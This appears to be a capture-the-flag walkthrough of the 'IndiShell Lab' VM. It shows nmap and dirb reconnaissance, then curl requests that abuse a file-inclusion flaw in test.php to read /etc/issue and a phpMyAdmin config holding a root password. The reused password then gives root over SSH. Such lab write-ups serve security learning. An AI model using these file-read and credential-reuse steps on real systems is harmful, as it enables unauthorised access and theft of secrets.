###### Recon Phase:

`$ nmap -p 1-65535 -T4 -A -v 192.168.190.133` 
    

> PORT   STATE SERVICE VERSION<br />
>     22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)<br />
>     | ssh-hostkey:<br />
>     |   1024 fa:cf:a2:52:c4:fa:f5:75:a7:e2:bd:60:83:3e:7b:de (DSA)<br />
>     |   2048 88:31:0c:78:98:80:ef:33:fa:26:22:ed:d0:9b:ba:f8 (RSA)<br />
>     |_  256 0e:5e:33:03:50:c9:1e:b3:e7:51:39:a4:4a:10:64:ca (ECDSA)<br />
>     80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))<br />
>     | http-methods:<br />
>     |_  Supported Methods: GET HEAD POST OPTIONS<br />
>     |_http-server-header: Apache/2.2.22 (Ubuntu)<br />
>     |_http-title: --==[[IndiShell Lab]]==--<br />

`$ dirb http://192.168.190.133 /usr/share/wordlists/dirb/big.txt`
There is phpmyadmin in /phpmy/

----------
###### Attacking Phase:



I saw /test.php that reads a parameter called file so i passed it using curl <br />
`$ curl -X POST -F 'file=/etc/issue' http://192.168.190.133/test.php`<br />
>    Ubuntu 12.04.5 LTS \n \l <br />

Then i tried to extract phpmyadmin's config file<br />
`$ curl -X POST -F 'file=/var/www/phpmy/config.inc.php' http://192.168.190.133/test.php`<br />

    <?php
    /* Servers configuration */
    $i = 0;

    /* Server: localhost [1] */
    $i++;
    $cfg['Servers'][$i]['verbose'] = 'localhost';
    $cfg['Servers'][$i]['host'] = 'localhost';
    $cfg['Servers'][$i]['port'] = '';
    $cfg['Servers'][$i]['socket'] = '';
    $cfg['Servers'][$i]['connect_type'] = 'tcp';
    $cfg['Servers'][$i]['extension'] = 'mysqli';
    $cfg['Servers'][$i]['auth_type'] = 'cookie';
    $cfg['Servers'][$i]['user'] = 'root';
    $cfg['Servers'][$i]['password'] = 'roottoor';
    $cfg['Servers'][$i]['AllowNoPassword'] = true;

    /* End of servers configuration */

    $cfg['DefaultLang'] = 'en-utf-8';
    $cfg['ServerDefault'] = 1;
    $cfg['UploadDir'] = '';
    $cfg['SaveDir'] = '';


    /* rajk - for blobstreaming */
    $cfg['Servers'][$i]['bs_garbage_threshold'] = 50;
    $cfg['Servers'][$i]['bs_repository_threshold'] = '32M';
    $cfg['Servers'][$i]['bs_temp_blob_timeout'] = 600;
    $cfg['Servers'][$i]['bs_temp_log_threshold'] = '32M';
    ?>

so i tried to access with username : root, password : roottoor and i failed then i treid ssh<br />
`$ ssh root@192.168.190.133`<br />

    Welcome to Ubuntu 12.04.5 LTS (GNU/Linux 3.13.0-32-generic i686)
     * Documentation:  https://help.ubuntu.com/

      System information as of Mon May 22 01:41:39 IST 2017

      System load:  0.0               Processes:           107
      Usage of /:   12.1% of 9.61GB   Users logged in:     0
      Memory usage: 11%               IP address for eth0: 192.168.190.133
      Swap usage:   0%

      Graph this data and manage this system at:
        https://landscape.canonical.com/

    New release '14.04.5 LTS' available.
    Run 'do-release-upgrade' to upgrade to it.


    Your Hardware Enablement Stack (HWE) is supported until April 2017.
`$ id`<br />
 >   uid=0(root) gid=0(root) groups=0(root)
----------



